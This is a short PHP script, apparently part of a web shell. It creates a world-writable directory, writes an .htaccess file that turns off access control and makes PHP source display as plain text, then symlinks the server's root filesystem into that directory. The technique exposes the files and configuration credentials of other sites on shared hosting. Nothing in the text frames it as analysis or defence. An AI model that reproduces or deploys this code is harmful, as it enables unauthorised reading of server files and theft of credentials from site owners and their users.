<?php

@mkdir('berandal',0777);
$htcs = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain \n AddHandler txt.html \n Require None \n Satisfy Any";
$f =@fopen ('berandal/.htaccess','w');
fwrite($f , $htcs);



@symlink("/","berandal/root");

$pg = basename(__FILE__);
?>